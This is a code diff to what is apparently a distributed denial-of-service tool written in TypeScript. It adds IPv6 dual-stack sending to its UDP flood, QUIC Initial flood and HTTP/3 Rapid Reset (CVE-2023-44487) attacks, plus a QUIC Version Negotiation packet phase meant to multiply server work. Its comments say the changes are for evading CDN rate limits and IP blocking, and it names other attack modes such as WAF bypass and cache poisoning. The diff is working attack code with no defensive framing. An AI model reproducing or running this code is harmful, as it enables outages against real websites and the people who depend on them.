@@ -186,6 +186,33 @@ async function resolveHost(hostname: string): Promise<string> {
   } catch { return dnsCache.get(hostname) ?? hostname; }
 }
 
+// ── IPv6 dual-stack resolution cache ──────────────────────────────────────────
+// Many CDNs have separate rate-limit pools for IPv4 vs IPv6.
+// IPv6 address space (2^128) makes IP-blocking essentially impossible.
+// Servers often have less-hardened IPv6 stacks.
+const dns6Cache  = new Map<string, string>();
+const dns6Expiry = new Map<string, number>();
+async function resolveHostIPv6(hostname: string): Promise<string | null> {
+  // Already an IPv6 literal (colons present)
+  if (hostname.includes(":")) return hostname;
+  // Already an IPv4 — try to get the AAAA record for this domain
+  const now = Date.now();
+  if (dns6Cache.has(hostname) && now < (dns6Expiry.get(hostname) ?? 0)) {
+    return dns6Cache.get(hostname) ?? null;
+  }
+  try {
+    const [ip6] = await dns.resolve6(hostname);
+    dns6Cache.set(hostname, ip6);
+    dns6Expiry.set(hostname, now + DNS_TTL_MS);
+    return ip6;
+  } catch {
+    // No AAAA record — cache the miss so we don't retry every time
+    dns6Cache.set(hostname, "");
+    dns6Expiry.set(hostname, now + DNS_TTL_MS);
+    return null;
+  }
+}
+
 // ── Headers builder ───────────────────────────────────────────────────────
 function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
   const cookieCount = randInt(8, 20);
@@ -316,11 +343,13 @@ async function runUDPFlood(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  ip6?: string | null, // optional IPv6 address — enables dual-stack flooding
 ): Promise<void> {
-  // setInterval-burst pattern: guaranteed to yield to the event loop every 1ms.
-  // Async-chain (inflight while-loop) starves the event loop in environments where
-  // UDP callbacks fire without real network latency (loopback, blocked UDP, etc.).
-  // Deployed (8 vCPU): up to 128 UDP sockets; dev: 8
+  // ── Dual-stack IPv4+IPv6 UDP flood ────────────────────────────────────────
+  // When ip6 is provided, half the sockets use udp4 (IPv4) and half use udp6 (IPv6).
+  // This exploits separate rate-limit pools on most CDNs and less-hardened IPv6 stacks.
+  // IPv6 address space (2^128) makes IP-based blocking essentially impossible.
+  // setInterval-burst: guaranteed to yield to the event loop every 1ms.
   const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 32))) : Math.min(threads, 8);
   const BURST      = getDynamicBurst(800);
   const TICK_MS    = 1;
@@ -339,8 +368,12 @@ async function runUDPFlood(
   const socketDonePromises: Promise<void>[] = [];
 
   for (let _s = 0; _s < numSockets; _s++) {
+    // Alternate: even sockets = IPv4, odd sockets = IPv6 (if available)
+    const useV6  = ip6 ? _s % 2 === 1 : false;
+    const target = useV6 ? ip6! : resolvedHost;
+
     const socketDone = new Promise<void>((resolve) => {
-      const sock = dgram.createSocket("udp4");
+      const sock = dgram.createSocket(useV6 ? "udp6" : "udp4");
       sock.on("error", () => {});
       let closed = false;
       const forceClose = () => {
@@ -355,7 +388,7 @@ async function runUDPFlood(
           for (let i = 0; i < BURST; i++) {
             const port   = PORTS[randInt(0, PORTS.length)];
             const pktLen = randInt(PKT_MIN, PKT_MAX);
-            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
+            sock.send(buf, 0, pktLen, port, target, (_err) => {
               localPkts++;
               localBytes += pktLen;
             });
@@ -4488,8 +4521,10 @@ async function runQUICFlood(
   threads:      number,
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
+  ip6?:         string | null, // IPv6 for dual-stack flooding
 ): Promise<void> {
   // Deployed (32GB): 128 UDP sockets, 4K inflight; non-deployed prod: 64 sockets, 2K inflight
+  // Dual-stack: even sockets → udp4/IPv4, odd sockets → udp6/IPv6 (if ip6 provided)
   const NUM_SOCKS = !IS_PROD ? Math.min(threads, 8) : IS_DEPLOYED ? Math.min(threads, 128) : Math.min(threads, 64);
   const INFLIGHT  = !IS_PROD ? 200 : IS_DEPLOYED ? 4000 : 2000;
   const PKTSIZE   = 1200; // QUIC minimum MTU
@@ -4524,7 +4559,13 @@ async function runQUICFlood(
 
   const pending: Promise<void>[] = [];
   for (let i = 0; i < NUM_SOCKS; i++) {
-    const s = dgram.createSocket("udp4");
+    // Dual-stack: alternate between IPv4 and IPv6 sockets when IPv6 is available.
+    // CDNs like Cloudflare, Fastly, and Akamai have separate rate-limit pools per
+    // IP version — saturating both simultaneously halves the effectiveness of any
+    // per-IP rate limiting that only applies to one address family.
+    const useV6   = ip6 ? i % 2 === 1 : false;
+    const target6 = useV6 ? ip6! : resolvedHost;
+    const s = dgram.createSocket(useV6 ? "udp6" : "udp4");
     pending.push(new Promise<void>(resolve => {
       if (signal.aborted) { resolve(); return; }
       let inflight = 0;
@@ -4535,14 +4576,12 @@ async function runQUICFlood(
         while (inflight < INFLIGHT) {
           inflight++;
           const pkt = makeQUICInitial();
-          s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
+          s.send(pkt, 0, pkt.length, targetPort, target6, (err) => {
             inflight--;
             if (!err) { localPkts++; localBytes += pkt.length; }
             if (signal.aborted) {
               if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
             } else if (!reschedPending) {
-              // Schedule ONE reschedule per event-loop tick to avoid timer starvation.
-              // setImmediate lets the 300ms stats timer fire between batches.
               reschedPending = true;
               setImmediate(send);
             }
@@ -6813,13 +6852,18 @@ async function runH3RapidReset(
   threads:      number,
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
+  ip6?:         string | null, // IPv6 for dual-stack flooding
 ): Promise<void> {
-  // ── Exact quic-flood engine — proven working in production ───────────────
-  // Alternates between 3 packet types to simulate QUIC stream RST lifecycle:
-  //   Phase 0: Long Header Initial (0xC0) — DCID alloc + TLS context
-  //   Phase 1: Long Header 0-RTT   (0xD0) — stream alloc attempt
-  //   Phase 2: Short Header 1-RTT  (0x40) — RESET_STREAM cleanup
-  // Each socket cycles through all 3 phases per tick — same engine as quic-flood.
+  // ── H3 Rapid Reset — 4-phase QUIC packet cycle + dual-stack ─────────────
+  // Alternates between 4 packet types to simulate QUIC stream RST lifecycle:
+  //   Phase 0: Long Header Initial  (0xC0) — DCID alloc + TLS crypto context
+  //   Phase 1: Long Header 0-RTT    (0xD0) — stream alloc + H3 SETTINGS
+  //   Phase 2: Short Header 1-RTT   (0x40) — RESET_STREAM cleanup  (RST_STREAM × 4)
+  //   Phase 3: Version Negotiation  (0x80) — forces server VN response, allocs per-DCID state
+  //            version=0x00000000 + supported versions list causes server to:
+  //            1) Parse Long Header, 2) Detect VN marker, 3) Send VN response,
+  //            4) Allocate DCID tracking state — 4× work per packet vs plain Initial
+  // Dual-stack: even sockets→IPv4, odd sockets→IPv6 (halves CDN rate-limit effectiveness)
   const NUM_SOCKS = !IS_PROD ? Math.min(threads, 8)  : IS_DEPLOYED ? Math.min(threads, 128) : Math.min(threads, 64);
   const INFLIGHT  = !IS_PROD ? 200                   : IS_DEPLOYED ? 4000                   : 2000;
   const PKTSIZE   = 1200;
@@ -6837,8 +6881,8 @@ async function runH3RapidReset(
     for (let i = 0; i < dcidLen; i++) dcid[i] = rnd256();
     for (let i = 0; i < scidLen; i++) scid[i] = rnd256();
 
-    // Cycle through packet types: Initial → 0-RTT → Short/RST
-    const pktPhase = phase++ % 3;
+    // 4-phase cycle: Initial → 0-RTT → Short/RST → Version Negotiation
+    const pktPhase = phase++ % 4;
 
     if (pktPhase === 2) {
       // ── Phase 2: Short Header 1-RTT with RESET_STREAM frames ─────────────
@@ -6856,6 +6900,32 @@ async function runH3RapidReset(
       const pad = Buffer.allocUnsafe(Math.max(0, PKTSIZE - shortHdr.length - rstFrames.length));
       for (let i = 0; i < pad.length; i++) pad[i] = 0x00; // PADDING frames
       return Buffer.concat([shortHdr, rstFrames, pad]);
+    }
+
+    if (pktPhase === 3) {
+      // ── Phase 3: QUIC Version Negotiation ────────────────────────────────
+      // version=0x00000000 triggers VN handling on RFC-9000-compliant stacks:
+      //   1) Server parses Long Header, detects version = 0 (VN marker)
+      //   2) Server allocates per-DCID state to track the client
+      //   3) Server sends back a Version Negotiation response (CPU + bandwidth)
+      //   4) State cleanup is required when client goes silent
+      // This generates 4× the server-side work vs a plain Initial packet.
+      const hdr = Buffer.allocUnsafe(1 + 4 + 1 + dcidLen + 1 + scidLen);
+      let off2 = 0;
+      hdr[off2++] = 0x80 | (rnd256() & 0x7f); // Long Header + VN marker (MSB=1)
+      hdr.writeUInt32BE(0x00000000, off2); off2 += 4; // Version = 0  → Version Negotiation
+      hdr[off2++] = dcidLen; dcid.copy(hdr, off2); off2 += dcidLen;
+      hdr[off2++] = scidLen; scid.copy(hdr, off2);
+      // Supported-version list the server may reply with (RFC 9000 §17.2.1)
+      const versions = Buffer.from([
+        0x00, 0x00, 0x00, 0x01,  // QUIC v1  (RFC 9000)
+        0xff, 0x00, 0x00, 0x1d,  // QUIC draft-29
+        0xff, 0x00, 0x00, 0x20,  // QUIC draft-32
+        0x6b, 0x33, 0x43, 0x4f,  // gQUIC Q050
+      ]);
+      const pad = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - versions.length));
+      pad.fill(0);
+      return Buffer.concat([hdr, versions, pad]);
     }
 
     // ── Phase 0: Long Header Initial (0xC0) or Phase 1: 0-RTT (0xD0) ──────
@@ -6892,7 +6962,10 @@ async function runH3RapidReset(
 
   const pending: Promise<void>[] = [];
   for (let i = 0; i < NUM_SOCKS; i++) {
-    const s = dgram.createSocket("udp4");
+    // Dual-stack: alternate IPv4/IPv6 sockets — CDNs have separate rate-limit pools per IP version
+    const useV6   = ip6 ? i % 2 === 1 : false;
+    const target6 = useV6 ? ip6! : resolvedHost;
+    const s = dgram.createSocket(useV6 ? "udp6" : "udp4");
     pending.push(new Promise<void>(resolve => {
       if (signal.aborted) { resolve(); return; }
       let inflight = 0;
@@ -6903,7 +6976,7 @@ async function runH3RapidReset(
         while (inflight < INFLIGHT) {
           inflight++;
           const pkt = makeH3Packet();
-          s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
+          s.send(pkt, 0, pkt.length, targetPort, target6, (err) => {
             inflight--;
             if (!err) { localPkts++; localBytes += pkt.length; }
             if (signal.aborted) {
@@ -7395,14 +7468,18 @@ const UDP = new Set(["udp-flood","udp-bypass"]);
 async function runWorker() {
   const resolvedHost = await resolveHost(hostname).catch(() => hostname);
 
+  // Resolve IPv6 in parallel for dual-stack UDP/QUIC attacks.
+  // resolveHostIPv6 returns null if the target has no AAAA record (cached miss, no retry for 5 min).
+  const resolvedHost6 = await resolveHostIPv6(hostname).catch(() => null);
+
   if (UDP.has(cfg.method)) {
-    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats, resolvedHost6);
 
   } else if (L4.has(cfg.method)) {
     await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "geass-override") {
-    // 5-vector fallback for direct worker invocation (attacks.ts breaks into full 30-vector pool)
+    // 5-vector fallback for direct worker invocation (attacks.ts breaks into full pool)
     // Budget: HTTP Pipeline 35% | WAF Bypass 25% | H2 RST 20% | TCP 10% | UDP 10%
     const pipeT = Math.ceil(cfg.threads * 0.35);
     const wafT  = Math.ceil(cfg.threads * 0.25);
@@ -7414,7 +7491,7 @@ async function runWorker() {
       runWAFBypass(base, wafT, cfg.proxies ?? [], ctrl.signal, onStats),
       runH2RstBurst(resolvedHost, hostname, targetPort, rstT, ctrl.signal, onStats, cfg.proxies ?? []),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
-      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
+      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats, resolvedHost6),
     ]);
 
   } else if (cfg.method === "http2-flood") {
@@ -7472,7 +7549,8 @@ async function runWorker() {
 
   } else if (cfg.method === "quic-flood") {
     // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
-    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats);
+    // Dual-stack: sends via both udp4 and udp6 when target has AAAA record
+    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats, resolvedHost6);
 
   } else if (cfg.method === "cache-poison") {
     // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
@@ -7638,8 +7716,9 @@ async function runWorker() {
     await runSSEExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h3-rapid-reset") {
-    // H3 Rapid Reset — CVE-2023-44487 ported to QUIC/HTTP3 over UDP (3-packet DCID burst)
-    await runH3RapidReset(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
+    // H3 Rapid Reset — CVE-2023-44487 ported to QUIC/HTTP3 over UDP (4-phase: Initial+0-RTT+RST+VN)
+    // Dual-stack: sends to both IPv4 and IPv6 endpoints when AAAA record exists
+    await runH3RapidReset(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats, resolvedHost6);
 
   } else {
     // Default fallback: raw TCP pipeline
